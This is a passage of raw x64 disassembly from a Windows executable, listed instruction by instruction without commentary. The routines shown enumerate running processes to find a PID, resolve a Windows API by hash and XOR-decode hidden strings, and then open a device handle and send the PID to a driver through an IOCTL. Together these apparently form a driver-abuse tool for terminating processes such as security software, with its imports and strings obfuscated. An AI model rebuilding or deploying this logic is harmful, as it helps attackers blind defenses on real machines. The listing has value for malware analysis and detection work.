   140004f4e:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140004f54:	89 94 39 54 ff ff ff 	mov    %edx,-0xac(%rcx,%rdi,1)
   140004f5b:	48 8d 9f 60 ff ff ff 	lea    -0xa0(%rdi),%rbx
   140004f62:	48 8d 05 4f 9a 00 00 	lea    0x9a4f(%rip),%rax        # 0x14000e9b8
   140004f69:	48 89 03             	mov    %rax,(%rbx)
   140004f6c:	48 83 bb 80 00 00 00 	cmpq   $0x0,0x80(%rbx)
   140004f73:	00 
   140004f74:	74 2f                	je     0x140004fa5
   140004f76:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140004f7a:	48 8d 43 70          	lea    0x70(%rbx),%rax
   140004f7e:	48 39 01             	cmp    %rax,(%rcx)
   140004f81:	75 22                	jne    0x140004fa5
   140004f83:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   140004f8a:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140004f91:	48 89 11             	mov    %rdx,(%rcx)
   140004f94:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140004f98:	48 89 10             	mov    %rdx,(%rax)
   140004f9b:	44 2b c2             	sub    %edx,%r8d
   140004f9e:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140004fa2:	44 89 00             	mov    %r8d,(%rax)
   140004fa5:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   140004fa9:	74 08                	je     0x140004fb3
   140004fab:	48 8b cb             	mov    %rbx,%rcx
   140004fae:	e8 2d 31 00 00       	call   0x1400080e0
   140004fb3:	48 8b cb             	mov    %rbx,%rcx
   140004fb6:	ff 15 6c 61 00 00    	call   *0x616c(%rip)        # 0x14000b128
   140004fbc:	90                   	nop
   140004fbd:	48 8d 8f 68 ff ff ff 	lea    -0x98(%rdi),%rcx
   140004fc4:	ff 15 ae 61 00 00    	call   *0x61ae(%rip)        # 0x14000b178
   140004fca:	48 8b cf             	mov    %rdi,%rcx
   140004fcd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004fd2:	48 83 c4 20          	add    $0x20,%rsp
   140004fd6:	5f                   	pop    %rdi
   140004fd7:	48 ff 25 32 62 00 00 	rex.W jmp *0x6232(%rip)        # 0x14000b210
   140004fde:	cc                   	int3
   140004fdf:	cc                   	int3
   140004fe0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004fe5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004fea:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004fef:	57                   	push   %rdi
   140004ff0:	48 81 ec a0 02 00 00 	sub    $0x2a0,%rsp
   140004ff7:	48 8b 05 42 d0 00 00 	mov    0xd042(%rip),%rax        # 0x140012040
   140004ffe:	48 33 c4             	xor    %rsp,%rax
   140005001:	48 89 84 24 90 02 00 	mov    %rax,0x290(%rsp)
   140005008:	00 
   140005009:	4c 8b 49 10          	mov    0x10(%rcx),%r9
   14000500d:	33 ed                	xor    %ebp,%ebp
   14000500f:	48 83 79 18 0f       	cmpq   $0xf,0x18(%rcx)
   140005014:	8b f5                	mov    %ebp,%esi
   140005016:	76 08                	jbe    0x140005020
   140005018:	48 8b 11             	mov    (%rcx),%rdx
   14000501b:	4c 03 ca             	add    %rdx,%r9
   14000501e:	eb 06                	jmp    0x140005026
   140005020:	4c 03 c9             	add    %rcx,%r9
   140005023:	48 8b d1             	mov    %rcx,%rdx
   140005026:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   14000502b:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000502e:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140005033:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140005038:	49 3b d1             	cmp    %r9,%rdx
   14000503b:	75 11                	jne    0x14000504e
   14000503d:	bb 07 00 00 00       	mov    $0x7,%ebx
   140005042:	66 89 6c 24 30       	mov    %bp,0x30(%rsp)
   140005047:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   14000504c:	eb 12                	jmp    0x140005060
   14000504e:	4c 2b ca             	sub    %rdx,%r9
   140005051:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140005056:	e8 85 29 00 00       	call   0x1400079e0
   14000505b:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140005060:	33 d2                	xor    %edx,%edx
   140005062:	b9 02 00 00 00       	mov    $0x2,%ecx
   140005067:	ff 15 a3 5f 00 00    	call   *0x5fa3(%rip)        # 0x14000b010
   14000506d:	48 8b f8             	mov    %rax,%rdi
   140005070:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005074:	0f 84 91 00 00 00    	je     0x14000510b
   14000507a:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000507f:	c7 44 24 50 38 02 00 	movl   $0x238,0x50(%rsp)
   140005086:	00 
   140005087:	48 8b c8             	mov    %rax,%rcx
   14000508a:	ff 15 a0 5f 00 00    	call   *0x5fa0(%rip)        # 0x14000b030
   140005090:	85 c0                	test   %eax,%eax
   140005092:	74 6e                	je     0x140005102
   140005094:	0f 1f 40 00          	nopl   0x0(%rax)
   140005098:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000509f:	00 
   1400050a0:	48 8d 4c 24 7c       	lea    0x7c(%rsp),%rcx
   1400050a5:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   1400050ac:	0f 1f 40 00          	nopl   0x0(%rax)
   1400050b0:	48 ff c0             	inc    %rax
   1400050b3:	66 39 34 41          	cmp    %si,(%rcx,%rax,2)
   1400050b7:	75 f7                	jne    0x1400050b0
   1400050b9:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   1400050be:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400050c3:	48 83 fb 07          	cmp    $0x7,%rbx
   1400050c7:	48 0f 47 4c 24 30    	cmova  0x30(%rsp),%rcx
   1400050cd:	4c 3b c0             	cmp    %rax,%r8
   1400050d0:	75 18                	jne    0x1400050ea
   1400050d2:	4d 85 c0             	test   %r8,%r8
   1400050d5:	74 27                	je     0x1400050fe
   1400050d7:	48 8d 54 24 7c       	lea    0x7c(%rsp),%rdx
   1400050dc:	e8 af c2 ff ff       	call   0x140001390
   1400050e1:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   1400050e6:	85 c0                	test   %eax,%eax
   1400050e8:	74 14                	je     0x1400050fe
   1400050ea:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400050ef:	48 8b cf             	mov    %rdi,%rcx
   1400050f2:	ff 15 28 5f 00 00    	call   *0x5f28(%rip)        # 0x14000b020
   1400050f8:	85 c0                	test   %eax,%eax
   1400050fa:	75 a4                	jne    0x1400050a0
   1400050fc:	eb 04                	jmp    0x140005102
   1400050fe:	8b 74 24 58          	mov    0x58(%rsp),%esi
   140005102:	48 8b cf             	mov    %rdi,%rcx
   140005105:	ff 15 2d 5f 00 00    	call   *0x5f2d(%rip)        # 0x14000b038
   14000510b:	48 83 fb 07          	cmp    $0x7,%rbx
   14000510f:	76 49                	jbe    0x14000515a
   140005111:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140005116:	48 8d 14 5d 02 00 00 	lea    0x2(,%rbx,2),%rdx
   14000511d:	00 
   14000511e:	48 8b c1             	mov    %rcx,%rax
   140005121:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140005128:	72 2b                	jb     0x140005155
   14000512a:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000512e:	48 83 c2 27          	add    $0x27,%rdx
   140005132:	48 2b c1             	sub    %rcx,%rax
   140005135:	48 83 e8 08          	sub    $0x8,%rax
   140005139:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000513d:	76 16                	jbe    0x140005155
   14000513f:	45 33 c9             	xor    %r9d,%r9d
   140005142:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140005147:	45 33 c0             	xor    %r8d,%r8d
   14000514a:	33 d2                	xor    %edx,%edx
   14000514c:	33 c9                	xor    %ecx,%ecx
   14000514e:	ff 15 fc 61 00 00    	call   *0x61fc(%rip)        # 0x14000b350
   140005154:	cc                   	int3
   140005155:	e8 42 39 00 00       	call   0x140008a9c
   14000515a:	8b c6                	mov    %esi,%eax
   14000515c:	48 8b 8c 24 90 02 00 	mov    0x290(%rsp),%rcx
   140005163:	00 
   140005164:	48 33 cc             	xor    %rsp,%rcx
   140005167:	e8 94 36 00 00       	call   0x140008800
   14000516c:	4c 8d 9c 24 a0 02 00 	lea    0x2a0(%rsp),%r11
   140005173:	00 
   140005174:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140005178:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   14000517c:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140005180:	49 8b e3             	mov    %r11,%rsp
   140005183:	5f                   	pop    %rdi
   140005184:	c3                   	ret
   140005185:	cc                   	int3
   140005186:	cc                   	int3
   140005187:	cc                   	int3
   140005188:	cc                   	int3
   140005189:	cc                   	int3
   14000518a:	cc                   	int3
   14000518b:	cc                   	int3
   14000518c:	cc                   	int3
   14000518d:	cc                   	int3
   14000518e:	cc                   	int3
   14000518f:	cc                   	int3
   140005190:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005195:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000519a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000519f:	55                   	push   %rbp
   1400051a0:	41 56                	push   %r14
   1400051a2:	41 57                	push   %r15
   1400051a4:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   1400051a9:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   1400051b0:	48 8b 05 89 ce 00 00 	mov    0xce89(%rip),%rax        # 0x140012040
   1400051b7:	48 33 c4             	xor    %rsp,%rax
   1400051ba:	48 89 45 37          	mov    %rax,0x37(%rbp)
   1400051be:	48 8b d9             	mov    %rcx,%rbx
   1400051c1:	48 89 4d ff          	mov    %rcx,-0x1(%rbp)
   1400051c5:	45 33 f6             	xor    %r14d,%r14d
   1400051c8:	48 8d 0d b1 97 00 00 	lea    0x97b1(%rip),%rcx        # 0x14000e980
   1400051cf:	ff 15 33 5e 00 00    	call   *0x5e33(%rip)        # 0x14000b008
   1400051d5:	48 85 c0             	test   %rax,%rax
   1400051d8:	0f 84 c4 01 00 00    	je     0x1400053a2
   1400051de:	ba ce c9 ca bd       	mov    $0xbdcac9ce,%edx
   1400051e3:	48 8b c8             	mov    %rax,%rcx
   1400051e6:	e8 05 f3 ff ff       	call   0x1400044f0
   1400051eb:	48 8b f0             	mov    %rax,%rsi
   1400051ee:	48 8b 15 d3 b2 01 00 	mov    0x1b2d3(%rip),%rdx        # 0x1400204c8
   1400051f5:	48 8d 4d 0f          	lea    0xf(%rbp),%rcx
   1400051f9:	e8 62 12 00 00       	call   0x140006460
   1400051fe:	4c 8d 1d e3 96 00 00 	lea    0x96e3(%rip),%r11        # 0x14000e8e8
   140005205:	48 c7 c7 ff ff ff ff 	mov    $0xffffffffffffffff,%rdi
   14000520c:	4c 8b cf             	mov    %rdi,%r9
   14000520f:	90                   	nop
   140005210:	49 ff c1             	inc    %r9
   140005213:	43 80 3c 0b 00       	cmpb   $0x0,(%r11,%r9,1)
   140005218:	75 f6                	jne    0x140005210
   14000521a:	4d 8b d6             	mov    %r14,%r10
   14000521d:	4c 39 35 a4 b2 01 00 	cmp    %r14,0x1b2a4(%rip)        # 0x1400204c8
   140005224:	76 4c                	jbe    0x140005272
   140005226:	4c 8d 3d 8b b2 01 00 	lea    0x1b28b(%rip),%r15        # 0x1400204b8
   14000522d:	0f 1f 00             	nopl   (%rax)
   140005230:	4d 8b c7             	mov    %r15,%r8
   140005233:	48 83 3d 95 b2 01 00 	cmpq   $0xf,0x1b295(%rip)        # 0x1400204d0
   14000523a:	0f 
   14000523b:	4c 0f 47 05 75 b2 01 	cmova  0x1b275(%rip),%r8        # 0x1400204b8
   140005242:	00 
   140005243:	48 8d 4d 0f          	lea    0xf(%rbp),%rcx
   140005247:	48 83 7d 27 0f       	cmpq   $0xf,0x27(%rbp)
   14000524c:	48 0f 47 4d 0f       	cmova  0xf(%rbp),%rcx
   140005251:	33 d2                	xor    %edx,%edx
   140005253:	49 8b c2             	mov    %r10,%rax
   140005256:	49 f7 f1             	div    %r9
   140005259:	42 0f b6 04 1a       	movzbl (%rdx,%r11,1),%eax
   14000525e:	43 32 04 10          	xor    (%r8,%r10,1),%al
   140005262:	42 88 04 11          	mov    %al,(%rcx,%r10,1)
   140005266:	49 ff c2             	inc    %r10
   140005269:	4c 3b 15 58 b2 01 00 	cmp    0x1b258(%rip),%r10        # 0x1400204c8
   140005270:	72 be                	jb     0x140005230
   140005272:	48 8d 4d 0f          	lea    0xf(%rbp),%rcx
   140005276:	48 83 7d 27 0f       	cmpq   $0xf,0x27(%rbp)
   14000527b:	48 0f 47 4d 0f       	cmova  0xf(%rbp),%rcx
   140005280:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140005285:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   14000528c:	00 
   14000528d:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   140005294:	00 
   140005295:	45 33 c9             	xor    %r9d,%r9d
   140005298:	45 33 c0             	xor    %r8d,%r8d
   14000529b:	ba 00 00 00 c0       	mov    $0xc0000000,%edx
   1400052a0:	ff d6                	call   *%rsi
   1400052a2:	48 8b f0             	mov    %rax,%rsi
   1400052a5:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400052a9:	0f 85 65 01 00 00    	jne    0x140005414
   1400052af:	ff 15 63 5d 00 00    	call   *0x5d63(%rip)        # 0x14000b018
   1400052b5:	8b f0                	mov    %eax,%esi
   1400052b7:	48 8b 15 ca b1 01 00 	mov    0x1b1ca(%rip),%rdx        # 0x140020488
   1400052be:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   1400052c2:	e8 99 11 00 00       	call   0x140006460
   1400052c7:	4c 8d 15 12 96 00 00 	lea    0x9612(%rip),%r10        # 0x14000e8e0
   1400052ce:	66 90                	xchg   %ax,%ax
   1400052d0:	48 ff c7             	inc    %rdi
   1400052d3:	41 80 3c 3a 00       	cmpb   $0x0,(%r10,%rdi,1)
   1400052d8:	75 f6                	jne    0x1400052d0
   1400052da:	4d 8b ce             	mov    %r14,%r9
   1400052dd:	4c 39 35 a4 b1 01 00 	cmp    %r14,0x1b1a4(%rip)        # 0x140020488
   1400052e4:	76 4c                	jbe    0x140005332
   1400052e6:	4c 8d 1d 8b b1 01 00 	lea    0x1b18b(%rip),%r11        # 0x140020478
   1400052ed:	0f 1f 00             	nopl   (%rax)
   1400052f0:	4d 8b c3             	mov    %r11,%r8
   1400052f3:	48 83 3d 95 b1 01 00 	cmpq   $0xf,0x1b195(%rip)        # 0x140020490
   1400052fa:	0f 
   1400052fb:	4c 0f 47 05 75 b1 01 	cmova  0x1b175(%rip),%r8        # 0x140020478
   140005302:	00 
   140005303:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   140005307:	48 83 7d ef 0f       	cmpq   $0xf,-0x11(%rbp)
   14000530c:	48 0f 47 4d d7       	cmova  -0x29(%rbp),%rcx
   140005311:	33 d2                	xor    %edx,%edx
   140005313:	49 8b c1             	mov    %r9,%rax
   140005316:	48 f7 f7             	div    %rdi
   140005319:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   14000531e:	43 32 04 08          	xor    (%r8,%r9,1),%al
   140005322:	42 88 04 09          	mov    %al,(%rcx,%r9,1)
   140005326:	49 ff c1             	inc    %r9
   140005329:	4c 3b 0d 58 b1 01 00 	cmp    0x1b158(%rip),%r9        # 0x140020488
   140005330:	72 be                	jb     0x1400052f0
   140005332:	48 8d 15 97 a7 01 00 	lea    0x1a797(%rip),%rdx        # 0x14001fad0
   140005339:	48 83 3d a7 a7 01 00 	cmpq   $0xf,0x1a7a7(%rip)        # 0x14001fae8
   140005340:	0f 
   140005341:	44 8b ce             	mov    %esi,%r9d
   140005344:	48 0f 47 15 84 a7 01 	cmova  0x1a784(%rip),%rdx        # 0x14001fad0
   14000534b:	00 
   14000534c:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   140005350:	e8 6b f2 ff ff       	call   0x1400045c0
   140005355:	90                   	nop
   140005356:	48 8b 55 27          	mov    0x27(%rbp),%rdx
   14000535a:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000535e:	76 31                	jbe    0x140005391
   140005360:	48 ff c2             	inc    %rdx
   140005363:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
   140005367:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000536e:	48 8b c1             	mov    %rcx,%rax
   140005371:	72 19                	jb     0x14000538c
   140005373:	48 83 c2 27          	add    $0x27,%rdx
   140005377:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000537b:	48 2b c1             	sub    %rcx,%rax
   14000537e:	48 83 e8 08          	sub    $0x8,%rax
   140005382:	48 83 f8 1f          	cmp    $0x1f,%rax
   140005386:	0f 87 aa 01 00 00    	ja     0x140005536
   14000538c:	e8 0b 37 00 00       	call   0x140008a9c
   140005391:	66 0f 6f 05 57 97 00 	movdqa 0x9757(%rip),%xmm0        # 0x14000eaf0
   140005398:	00 
   140005399:	f3 0f 7f 45 1f       	movdqu %xmm0,0x1f(%rbp)
   14000539e:	c6 45 0f 00          	movb   $0x0,0xf(%rbp)
   1400053a2:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   1400053a6:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400053aa:	76 30                	jbe    0x1400053dc
   1400053ac:	48 ff c2             	inc    %rdx
   1400053af:	48 8b 0b             	mov    (%rbx),%rcx
   1400053b2:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400053b9:	72 1c                	jb     0x1400053d7
   1400053bb:	48 83 c2 27          	add    $0x27,%rdx
   1400053bf:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   1400053c3:	48 2b c8             	sub    %rax,%rcx
   1400053c6:	48 83 e9 08          	sub    $0x8,%rcx
   1400053ca:	48 83 f9 1f          	cmp    $0x1f,%rcx
   1400053ce:	0f 87 78 01 00 00    	ja     0x14000554c
   1400053d4:	48 8b c8             	mov    %rax,%rcx
   1400053d7:	e8 c0 36 00 00       	call   0x140008a9c
   1400053dc:	c6 03 00             	movb   $0x0,(%rbx)
   1400053df:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   1400053e6:	00 
   1400053e7:	4c 89 73 10          	mov    %r14,0x10(%rbx)
   1400053eb:	48 8b 4d 37          	mov    0x37(%rbp),%rcx
   1400053ef:	48 33 cc             	xor    %rsp,%rcx
   1400053f2:	e8 09 34 00 00       	call   0x140008800
   1400053f7:	4c 8d 9c 24 b0 00 00 	lea    0xb0(%rsp),%r11
   1400053fe:	00 
   1400053ff:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140005403:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140005407:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   14000540b:	49 8b e3             	mov    %r11,%rsp
   14000540e:	41 5f                	pop    %r15
   140005410:	41 5e                	pop    %r14
   140005412:	5d                   	pop    %rbp
   140005413:	c3                   	ret
   140005414:	48 8b cb             	mov    %rbx,%rcx
   140005417:	e8 c4 fb ff ff       	call   0x140004fe0
   14000541c:	89 45 07             	mov    %eax,0x7(%rbp)
   14000541f:	85 c0                	test   %eax,%eax
   140005421:	0f 84 2f ff ff ff    	je     0x140005356
   140005427:	44 89 75 33          	mov    %r14d,0x33(%rbp)
   14000542b:	44 89 75 2f          	mov    %r14d,0x2f(%rbp)
   14000542f:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140005434:	48 8d 45 2f          	lea    0x2f(%rbp),%rax
   140005438:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000543d:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140005444:	00 
   140005445:	48 8d 45 33          	lea    0x33(%rbp),%rax
   140005449:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000544e:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140005454:	4c 8d 45 07          	lea    0x7(%rbp),%r8
   140005458:	ba 18 20 22 00       	mov    $0x222018,%edx
   14000545d:	48 8b ce             	mov    %rsi,%rcx
   140005460:	ff 15 9a 5b 00 00    	call   *0x5b9a(%rip)        # 0x14000b000
   140005466:	85 c0                	test   %eax,%eax
   140005468:	0f 85 8a 00 00 00    	jne    0x1400054f8
   14000546e:	ff 15 a4 5b 00 00    	call   *0x5ba4(%rip)        # 0x14000b018
   140005474:	8b f0                	mov    %eax,%esi
   140005476:	48 8b 15 4b b1 01 00 	mov    0x1b14b(%rip),%rdx        # 0x1400205c8
   14000547d:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   140005481:	e8 da 0f 00 00       	call   0x140006460
   140005486:	4c 8d 15 63 94 00 00 	lea    0x9463(%rip),%r10        # 0x14000e8f0
   14000548d:	0f 1f 00             	nopl   (%rax)
   140005490:	48 ff c7             	inc    %rdi
   140005493:	41 80 3c 3a 00       	cmpb   $0x0,(%r10,%rdi,1)
   140005498:	75 f6                	jne    0x140005490
   14000549a:	4d 8b ce             	mov    %r14,%r9
   14000549d:	4c 39 35 24 b1 01 00 	cmp    %r14,0x1b124(%rip)        # 0x1400205c8
   1400054a4:	0f 86 88 fe ff ff    	jbe    0x140005332
   1400054aa:	4c 8d 1d 07 b1 01 00 	lea    0x1b107(%rip),%r11        # 0x1400205b8
   1400054b1:	4d 8b c3             	mov    %r11,%r8
   1400054b4:	48 83 3d 14 b1 01 00 	cmpq   $0xf,0x1b114(%rip)        # 0x1400205d0
   1400054bb:	0f 
   1400054bc:	4c 0f 47 05 f4 b0 01 	cmova  0x1b0f4(%rip),%r8        # 0x1400205b8
   1400054c3:	00 
   1400054c4:	48 8d 4d d7          	lea    -0x29(%rbp),%rcx
   1400054c8:	48 83 7d ef 0f       	cmpq   $0xf,-0x11(%rbp)
   1400054cd:	48 0f 47 4d d7       	cmova  -0x29(%rbp),%rcx
   1400054d2:	33 d2                	xor    %edx,%edx
   1400054d4:	49 8b c1             	mov    %r9,%rax
   1400054d7:	48 f7 f7             	div    %rdi
   1400054da:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   1400054df:	43 32 04 08          	xor    (%r8,%r9,1),%al
   1400054e3:	42 88 04 09          	mov    %al,(%rcx,%r9,1)
   1400054e7:	49 ff c1             	inc    %r9
   1400054ea:	4c 3b 0d d7 b0 01 00 	cmp    0x1b0d7(%rip),%r9        # 0x1400205c8
   1400054f1:	72 be                	jb     0x1400054b1
   1400054f3:	e9 3a fe ff ff       	jmp    0x140005332
   1400054f8:	48 8b 55 27          	mov    0x27(%rbp),%rdx
   1400054fc:	48 83 fa 0f          	cmp    $0xf,%rdx
   140005500:	0f 86 8b fe ff ff    	jbe    0x140005391
   140005506:	48 ff c2             	inc    %rdx
   140005509:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
   14000550d:	48 8b c1             	mov    %rcx,%rax
   140005510:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140005517:	0f 82 6f fe ff ff    	jb     0x14000538c
   14000551d:	48 83 c2 27          	add    $0x27,%rdx
   140005521:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140005525:	48 2b c1             	sub    %rcx,%rax
   140005528:	48 83 e8 08          	sub    $0x8,%rax
   14000552c:	48 83 f8 1f          	cmp    $0x1f,%rax
   140005530:	0f 86 56 fe ff ff    	jbe    0x14000538c
   140005536:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   14000553b:	45 33 c9             	xor    %r9d,%r9d
   14000553e:	45 33 c0             	xor    %r8d,%r8d
   140005541:	33 d2                	xor    %edx,%edx
   140005543:	33 c9                	xor    %ecx,%ecx
   140005545:	ff 15 05 5e 00 00    	call   *0x5e05(%rip)        # 0x14000b350
   14000554b:	90                   	nop
   14000554c:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140005551:	45 33 c9             	xor    %r9d,%r9d
   140005554:	45 33 c0             	xor    %r8d,%r8d
   140005557:	33 d2                	xor    %edx,%edx
   140005559:	33 c9                	xor    %ecx,%ecx
   14000555b:	ff 15 ef 5d 00 00    	call   *0x5def(%rip)        # 0x14000b350
   140005561:	cc                   	int3
   140005562:	cc                   	int3
   140005563:	cc                   	int3
   140005564:	cc                   	int3
   140005565:	cc                   	int3
   140005566:	cc                   	int3
   140005567:	cc                   	int3
   140005568:	cc                   	int3
   140005569:	cc                   	int3
   14000556a:	cc                   	int3
   14000556b:	cc                   	int3
   14000556c:	cc                   	int3
   14000556d:	cc                   	int3
   14000556e:	cc                   	int3
   14000556f:	cc                   	int3
   140005570:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005575:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000557a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000557f:	55                   	push   %rbp
   140005580:	41 54                	push   %r12
   140005582:	41 55                	push   %r13
   140005584:	41 56                	push   %r14
   140005586:	41 57                	push   %r15
   140005588:	48 8d 6c 24 c0       	lea    -0x40(%rsp),%rbp
   14000558d:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   140005594:	48 8b 05 a5 ca 00 00 	mov    0xcaa5(%rip),%rax        # 0x140012040
   14000559b:	48 33 c4             	xor    %rsp,%rax
   14000559e:	48 89 45 38          	mov    %rax,0x38(%rbp)
   1400055a2:	33 f6                	xor    %esi,%esi
   1400055a4:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400055a7:	0f 11 44 24 70       	movups %xmm0,0x70(%rsp)
   1400055ac:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400055af:	f3 0f 7f 4d 80       	movdqu %xmm1,-0x80(%rbp)
   1400055b4:	48 8d 15 25 85 00 00 	lea    0x8525(%rip),%rdx        # 0x14000dae0
   1400055bb:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   1400055c2:	4c 8b c3             	mov    %rbx,%r8
   1400055c5:	49 ff c0             	inc    %r8
   1400055c8:	42 38 34 02          	cmp    %sil,(%rdx,%r8,1)
   1400055cc:	75 f7                	jne    0x1400055c5
   1400055ce:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400055d3:	e8 58 25 00 00       	call   0x140007b30
   1400055d8:	90                   	nop
   1400055d9:	4c 8b 7d 80          	mov    -0x80(%rbp),%r15
   1400055dd:	49 8b d7             	mov    %r15,%rdx
   1400055e0:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400055e4:	e8 77 0e 00 00       	call   0x140006460
   1400055e9:	4c 8d 1d 00 93 00 00 	lea    0x9300(%rip),%r11        # 0x14000e8f0
   1400055f0:	4c 8b d3             	mov    %rbx,%r10
   1400055f3:	49 ff c2             	inc    %r10
   1400055f6:	43 80 3c 13 00       	cmpb   $0x0,(%r11,%r10,1)
   1400055fb:	75 f6                	jne    0x1400055f3
   1400055fd:	4c 8b ce             	mov    %rsi,%r9
   140005600:	4c 8b 75 88          	mov    -0x78(%rbp),%r14
   140005604:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   140005609:	4d 85 ff             	test   %r15,%r15
   14000560c:	74 3a                	je     0x140005648
   14000560e:	66 90                	xchg   %ax,%ax
   140005610:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140005615:	49 83 fe 0f          	cmp    $0xf,%r14
   140005619:	4c 0f 47 c7          	cmova  %rdi,%r8
   14000561d:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140005621:	48 83 7d d8 0f       	cmpq   $0xf,-0x28(%rbp)
   140005626:	48 0f 47 4d c0       	cmova  -0x40(%rbp),%rcx
   14000562b:	33 d2                	xor    %edx,%edx
   14000562d:	49 8b c1             	mov    %r9,%rax
   140005630:	49 f7 f2             	div    %r10
   140005633:	42 0f b6 04 1a       	movzbl (%rdx,%r11,1),%eax
   140005638:	43 32 04 08          	xor    (%r8,%r9,1),%al
   14000563c:	42 88 04 09          	mov    %al,(%rcx,%r9,1)
   140005640:	49 ff c1             	inc    %r9
   140005643:	4d 3b cf             	cmp    %r15,%r9
   140005646:	72 c8                	jb     0x140005610
   140005648:	48 8b 15 99 a4 01 00 	mov    0x1a499(%rip),%rdx        # 0x14001fae8
   14000564f:	48 83 fa 0f          	cmp    $0xf,%rdx
   140005653:	76 30                	jbe    0x140005685
   140005655:	48 8b 0d 74 a4 01 00 	mov    0x1a474(%rip),%rcx        # 0x14001fad0
   14000565c:	48 ff c2             	inc    %rdx
   14000565f:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140005666:	72 18                	jb     0x140005680
   140005668:	48 83 c2 27          	add    $0x27,%rdx
   14000566c:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140005670:	48 2b c8             	sub    %rax,%rcx
   140005673:	48 83 e9 08          	sub    $0x8,%rcx
   140005677:	48 83 f9 1f          	cmp    $0x1f,%rcx
   14000567b:	77 70                	ja     0x1400056ed
   14000567d:	48 8b c8             	mov    %rax,%rcx
   140005680:	e8 17 34 00 00       	call   0x140008a9c
   140005685:	0f 10 45 c0          	movups -0x40(%rbp),%xmm0
   140005689:	0f 11 05 40 a4 01 00 	movups %xmm0,0x1a440(%rip)        # 0x14001fad0
   140005690:	0f 10 4d d0          	movups -0x30(%rbp),%xmm1
